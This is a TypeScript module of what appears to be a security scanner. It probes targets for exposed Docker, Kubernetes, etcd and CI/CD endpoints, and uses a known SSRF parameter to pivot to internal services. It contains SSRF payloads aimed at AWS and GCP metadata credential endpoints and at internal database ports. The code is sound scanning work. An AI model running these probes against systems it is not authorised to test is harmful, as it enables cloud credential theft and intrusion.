// InjectProof — Cloud-Native & CI/CD Infrastructure Exploitation
// Container attacks, advanced SSRF pivoting, CI/CD webhook poisoning
// ADDITIVE module — does not modify existing scanners

import type { CrawledEndpoint, DetectorResult } from '@/types';
import { buildRequestString, buildResponseString } from '@/lib/utils';

interface CloudExploitConfig {
    baseUrl: string;
    requestTimeout: number;
    userAgent: string;
    authHeaders?: Record<string, string>;
}

async function probe(
    url: string, method: string, config: CloudExploitConfig,
    headers?: Record<string, string>, body?: string,
): Promise<{ status: number; body: string; time: number; reqStr: string; resStr: string } | null> {
    try {
        const h: Record<string, string> = { 'User-Agent': config.userAgent, ...config.authHeaders, ...headers };
        const start = Date.now();
        const r = await fetch(url, { method, headers: h, body, signal: AbortSignal.timeout(config.requestTimeout), redirect: 'manual' });
        const respBody = await r.text();
        const respHeaders: Record<string, string> = {};
        r.headers.forEach((v, k) => { respHeaders[k] = v; });
        return { status: r.status, body: respBody, time: Date.now() - start, reqStr: buildRequestString(method, url, h, body), resStr: buildResponseString(r.status, respHeaders, respBody) };
    } catch { return null; }
}

// ============================================================
// 1) CONTAINER & ORCHESTRATION ATTACK DETECTION
// ============================================================

export async function detectContainerExposure(config: CloudExploitConfig): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];

    const containerEndpoints = [
        // Docker API
        { url: `${config.baseUrl.replace(/:\d+/, ':2375')}/version`, name: 'Docker API (HTTP)', indicator: 'ApiVersion', severity: 'critical' as const },
        { url: `${config.baseUrl.replace(/:\d+/, ':2376')}/version`, name: 'Docker API (HTTPS)', indicator: 'ApiVersion', severity: 'critical' as const },
        // Kubernetes
        { url: `${config.baseUrl.replace(/:\d+/, ':10250')}/pods`, name: 'Kubernetes Kubelet', indicator: 'PodList', severity: 'critical' as const },
        { url: `${config.baseUrl.replace(/:\d+/, ':10255')}/pods`, name: 'Kubernetes Kubelet (Read-Only)', indicator: 'metadata', severity: 'high' as const },
        { url: `${config.baseUrl.replace(/:\d+/, ':6443')}/api`, name: 'Kubernetes API Server', indicator: 'APIVersions', severity: 'critical' as const },
        { url: `${config.baseUrl.replace(/:\d+/, ':8001')}/api`, name: 'Kubernetes Proxy', indicator: 'APIVersions', severity: 'high' as const },
        // etcd
        { url: `${config.baseUrl.replace(/:\d+/, ':2379')}/version`, name: 'etcd', indicator: 'etcdcluster', severity: 'critical' as const },
        { url: `${config.baseUrl.replace(/:\d+/, ':2379')}/v2/keys/`, name: 'etcd Keys', indicator: 'node', severity: 'critical' as const },
        // Container registries
        { url: `${config.baseUrl}/v2/_catalog`, name: 'Docker Registry', indicator: 'repositories', severity: 'high' as const },
        { url: `${config.baseUrl.replace(/:\d+/, ':5000')}/v2/_catalog`, name: 'Docker Registry (5000)', indicator: 'repositories', severity: 'high' as const },
    ];

    for (const ep of containerEndpoints) {
        const result = await probe(ep.url, 'GET', config);
        if (!result) continue;

        if (result.body.includes(ep.indicator) && result.status !== 404) {
            results.push({
                found: true,
                title: `Exposed ${ep.name} at ${ep.url}`,
                description: `The ${ep.name} endpoint is publicly accessible and responding with valid data. This allows unauthenticated access to container orchestration controls.`,
                category: 'container_exposure',
                severity: ep.severity,
                confidence: 'high',
                cweId: 'CWE-284',
                cweTitle: 'Improper Access Control',
                affectedUrl: ep.url,
                httpMethod: 'GET',
                request: result.reqStr,
                response: result.resStr,
                responseCode: result.status,
                impact: ep.name.includes('Docker')
                    ? 'Unauthenticated Docker API access allows creating containers, reading secrets, and achieving host-level RCE.'
                    : ep.name.includes('etcd')
                        ? 'etcd stores all Kubernetes secrets, configs, and state. Full access means complete cluster compromise.'
                        : 'Kubernetes API/Kubelet access allows pod enumeration, secret extraction, and potential cluster takeover.',
                remediation: `Restrict ${ep.name} to internal networks only. Enable authentication (TLS client certs, RBAC). Never expose management ports to the internet.`,
                reproductionSteps: [`Send GET request to: ${ep.url}`, `Response contains: ${ep.indicator}`],
                mappedOwasp: ['A05:2021'],
                mappedNist: ['AC-3', 'CM-7'],
            });
        }
    }

    return results;
}

// ============================================================
// 2) ADVANCED SSRF PIVOTING (Internal network sweep)
// ============================================================

export async function pivotSsrfInternalScan(
    endpoint: CrawledEndpoint,
    ssrfParam: string,
    config: CloudExploitConfig,
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];

    // Internal targets to probe via SSRF
    const internalTargets = [
        // AWS IMDSv2 (requires PUT for token first)
        { url: 'http://169.254.169.254/latest/api/token', method: 'PUT', headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' }, name: 'AWS IMDSv2 Token', indicator: '' },
        // Standard metadata
        { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', method: 'GET', name: 'AWS IAM Roles', indicator: '' },
        // GCP
        { url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', method: 'GET', headers: { 'Metadata-Flavor': 'Google' }, name: 'GCP Service Account Token', indicator: 'access_token' },
        // K8s service account
        { url: 'http://169.254.169.254/latest/meta-data/', method: 'GET', name: 'Cloud Metadata', indicator: '' },
        // Internal services
        { url: 'http://127.0.0.1:6379/INFO', method: 'GET', name: 'Internal Redis', indicator: 'redis_version' },
        { url: 'http://127.0.0.1:11211/stats', method: 'GET', name: 'Internal Memcached', indicator: 'STAT' },
        { url: 'http://127.0.0.1:9200/', method: 'GET', name: 'Internal Elasticsearch', indicator: 'cluster_name' },
        { url: 'http://127.0.0.1:27017/', method: 'GET', name: 'Internal MongoDB', indicator: '' },
        { url: 'http://127.0.0.1:5432/', method: 'GET', name: 'Internal PostgreSQL', indicator: '' },
        { url: 'http://127.0.0.1:3306/', method: 'GET', name: 'Internal MySQL', indicator: '' },
        // Common internal web services
        { url: 'http://127.0.0.1:8080/', method: 'GET', name: 'Internal Web (8080)', indicator: '' },
        { url: 'http://127.0.0.1:3000/', method: 'GET', name: 'Internal Web (3000)', indicator: '' },
        { url: 'http://127.0.0.1:8443/', method: 'GET', name: 'Internal HTTPS (8443)', indicator: '' },
        // Kubernetes internal
        { url: 'http://kubernetes.default.svc/api', method: 'GET', name: 'K8s Internal API', indicator: 'APIVersions' },
    ];

    for (const target of internalTargets) {
        const u = new URL(endpoint.url);
        u.searchParams.set(ssrfParam, target.url);
        const testUrl = u.toString();

        const result = await probe(testUrl, 'GET', config);
        if (!result) continue;

        // Check if the response contains internal service data
        const hasServiceData = result.body.length > 50 && result.status !== 404 &&
            !result.body.includes('<!DOCTYPE') && !result.body.includes('<html');

        if (hasServiceData || (target.indicator && result.body.includes(target.indicator))) {
            const hasCredentials = /access_token|AccessKeyId|SecretAccessKey|password|credential/i.test(result.body);

            results.push({
                found: true,
                title: `SSRF Pivot: Reached ${target.name} via "${ssrfParam}"`,
                description: `Using SSRF in parameter "${ssrfParam}", successfully reached internal service: ${target.name} at ${target.url}. ${hasCredentials ? '⚠️ CREDENTIALS DETECTED IN RESPONSE.' : ''}`,
                category: 'ssrf',
                severity: hasCredentials ? 'critical' : 'high',
                confidence: 'high',
                cweId: 'CWE-918',
                cweTitle: 'Server-Side Request Forgery',
                affectedUrl: endpoint.url,
                httpMethod: 'GET',
                parameter: ssrfParam,
                payload: target.url,
                request: result.reqStr,
                response: result.resStr,
                responseCode: result.status,
                responseTime: result.time,
                internalNetworkExposure: true,
                cloudMetadataExtracted: hasCredentials,
                extractedCloudSecrets: hasCredentials ? JSON.stringify({
                    source: target.name,
                    ssrfVector: `${ssrfParam}=${target.url}`,
                    warning: 'Credentials detected — sanitized for safety',
                    responseLength: result.body.length,
                }) : undefined,
                attackChainGraph: JSON.stringify({
                    nodes: [
                        { id: 'ssrf', type: 'vulnerability', label: `SSRF in ${ssrfParam}` },
                        { id: 'pivot', type: 'pivot', label: `Reached ${target.name}` },
                        ...(hasCredentials ? [{ id: 'cred', type: 'impact', label: 'Credential Extraction' }] : []),
                    ],
                    edges: [
                        { from: 'ssrf', to: 'pivot' },
                        ...(hasCredentials ? [{ from: 'pivot', to: 'cred' }] : []),
                    ],
                }),
                impact: `External SSRF successfully pivoted to internal network, reaching ${target.name}. ${hasCredentials ? 'Credentials were extracted, enabling further lateral movement.' : 'This confirms internal network accessibility from the internet.'}`,
                remediation: 'Implement strict SSRF URL validation. Block internal IP ranges (RFC 1918). Use network-level segmentation. Deploy SSRF-specific WAF rules.',
                reproductionSteps: [
                    `Set the "${ssrfParam}" parameter to: ${target.url}`,
                    `Observe that the response contains data from ${target.name}`,
                    ...(hasCredentials ? ['Extract credentials from the response body'] : []),
                ],
                mappedOwasp: ['A10:2021'],
                mappedNist: ['SC-7', 'AC-4'],
            });
        }
    }

    return results;
}

// ============================================================
// 3) CI/CD & WEBHOOK POISONING DETECTION
// ============================================================

export async function detectCiCdExposure(config: CloudExploitConfig): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];

    const cicdEndpoints = [
        // Jenkins
        { url: `${config.baseUrl.replace(/:\d+/, ':8080')}/api/json`, name: 'Jenkins API', indicator: '_class', severity: 'critical' as const },
        { url: `${config.baseUrl}/jenkins/api/json`, name: 'Jenkins (path)', indicator: '_class', severity: 'critical' as const },
        { url: `${config.baseUrl.replace(/:\d+/, ':8080')}/script`, name: 'Jenkins Script Console', indicator: 'Groovy', severity: 'critical' as const },
        // GitLab CI
        { url: `${config.baseUrl.replace(/:\d+/, ':8929')}/api/v4/projects`, name: 'GitLab API', indicator: 'id', severity: 'high' as const },
        // Argo CD
        { url: `${config.baseUrl.replace(/:\d+/, ':8080')}/api/v1/applications`, name: 'Argo CD', indicator: 'items', severity: 'high' as const },
        // SonarQube
        { url: `${config.baseUrl.replace(/:\d+/, ':9000')}/api/system/status`, name: 'SonarQube', indicator: 'status', severity: 'medium' as const },
        // Prometheus (may expose internal metrics)
        { url: `${config.baseUrl.replace(/:\d+/, ':9090')}/api/v1/targets`, name: 'Prometheus', indicator: 'activeTargets', severity: 'medium' as const },
        // Grafana
        { url: `${config.baseUrl.replace(/:\d+/, ':3000')}/api/org`, name: 'Grafana', indicator: 'name', severity: 'medium' as const },
        // Webhook endpoints
        { url: `${config.baseUrl}/webhook`, name: 'Webhook Endpoint', indicator: '', severity: 'low' as const },
        { url: `${config.baseUrl}/hooks`, name: 'Hooks Endpoint', indicator: '', severity: 'low' as const },
        { url: `${config.baseUrl}/.github/workflows`, name: 'GitHub Actions Config', indicator: '', severity: 'medium' as const },
        { url: `${config.baseUrl}/.gitlab-ci.yml`, name: 'GitLab CI Config', indicator: 'stages', severity: 'high' as const },
        { url: `${config.baseUrl}/Jenkinsfile`, name: 'Jenkinsfile', indicator: 'pipeline', severity: 'high' as const },
    ];

    for (const ep of cicdEndpoints) {
        const result = await probe(ep.url, 'GET', config);
        if (!result) continue;

        const isAccessible = result.status !== 404 && result.status < 500 && result.body.length > 10;
        const hasIndicator = ep.indicator ? result.body.includes(ep.indicator) : isAccessible;

        if (isAccessible && hasIndicator) {
            const isScriptConsole = ep.name.includes('Script Console');
            const isCiConfig = ep.name.includes('Config') || ep.name.includes('Jenkinsfile');

            results.push({
                found: true,
                title: `Exposed ${ep.name} at ${ep.url}`,
                description: `${ep.name} is publicly accessible. ${isScriptConsole ? 'CRITICAL: Script console allows arbitrary code execution on the CI/CD server!' : isCiConfig ? 'CI/CD configuration exposed — may reveal secrets, build processes, and deployment details.' : 'This CI/CD service should not be public.'}`,
                category: isScriptConsole || ep.name.includes('Jenkins') ? 'cicd_poisoning' : 'misconfig',
                severity: isScriptConsole ? 'critical' : ep.severity,
                confidence: ep.indicator ? 'high' : 'medium',
                cweId: isScriptConsole ? 'CWE-94' : 'CWE-284',
                cweTitle: isScriptConsole ? 'Improper Control of Generation of Code' : 'Improper Access Control',
                affectedUrl: ep.url,
                httpMethod: 'GET',
                request: result.reqStr,
                response: result.resStr.substring(0, 2000),
                responseCode: result.status,
                impact: isScriptConsole
                    ? 'Jenkins Script Console allows arbitrary Groovy code execution, providing full server RCE and access to build secrets, credentials, and deployment pipelines.'
                    : `Exposed ${ep.name} reveals infrastructure details and may allow unauthorized access to CI/CD pipelines.`,
                remediation: `Restrict ${ep.name} to internal networks. Enable authentication. Use VPN or IP whitelisting for management interfaces.`,
                mappedOwasp: ['A05:2021'],
                mappedNist: ['CM-7', 'AC-3'],
            });
        }
    }

    return results;
}
